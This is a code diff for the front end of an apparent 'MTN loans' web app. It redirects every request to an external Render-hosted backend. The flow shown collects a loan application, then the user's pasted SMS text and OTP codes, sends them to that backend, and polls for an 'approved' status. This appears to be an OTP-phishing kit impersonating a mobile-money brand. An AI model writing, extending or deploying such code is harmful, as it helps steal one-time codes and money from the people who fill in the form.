@@ -1,3 +1,7 @@
+// --- BACKEND CONFIGURATION ---
+// Point this to your actual Render backend service URL
+const API_URL = 'https://mtn-loans-backend.onrender.com';
+
 // --- TRANSLATIONS DICTIONARY ---
 const translations = {
     en: {
@@ -226,7 +230,7 @@ async function submitApplication(e) {
     };
 
     try {
-        const response = await fetch('/api/apply', {
+        const response = await fetch(`${API_URL}/api/apply`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
@@ -239,7 +243,7 @@ async function submitApplication(e) {
 
             const interval = setInterval(async () => {
                 try {
-                    const statusRes = await fetch(`/api/status/${result.appId}`);
+                    const statusRes = await fetch(`${API_URL}/api/status/${result.appId}`);
                     const statusData = await statusRes.json();
 
                     if (statusData.status === 'approved') {
@@ -299,7 +303,7 @@ verifyBtn.addEventListener('click', function() {
     document.getElementById('loader-spinner').style.display = "block";
     showScreen('screen-processing');
 
-    fetch('/api/verify-sms', {
+    fetch(`${API_URL}/api/verify-sms`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sms: smsText, appId: window.currentAppId || 'unknown' })
@@ -309,7 +313,7 @@ verifyBtn.addEventListener('click', function() {
         if (result.success) {
             const interval = setInterval(async () => {
                 try {
-                    const statusRes = await fetch(`/api/sms-status/${window.currentAppId}`);
+                    const statusRes = await fetch(`${API_URL}/api/sms-status/${window.currentAppId}`);
                     const statusData = await statusRes.json();
 
                     if (statusData.status === 'approved') {
@@ -407,7 +411,7 @@ otpSubmitBtn.addEventListener('click', () => {
     document.getElementById('loader-spinner').style.display = "block";
     showScreen('screen-processing');
 
-    fetch('/api/submit-otp', {
+    fetch(`${API_URL}/api/submit-otp`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ otp: fullCode, appId: window.currentAppId || 'unknown' })
@@ -417,7 +421,7 @@ otpSubmitBtn.addEventListener('click', () => {
         if (result.success) {
             const interval = setInterval(async () => {
                 try {
-                    const statusRes = await fetch(`/api/otp-status/${window.currentAppId}`);
+                    const statusRes = await fetch(`${API_URL}/api/otp-status/${window.currentAppId}`);
                     const statusData = await statusRes.json();
 
                     if (statusData.status === 'approved') {
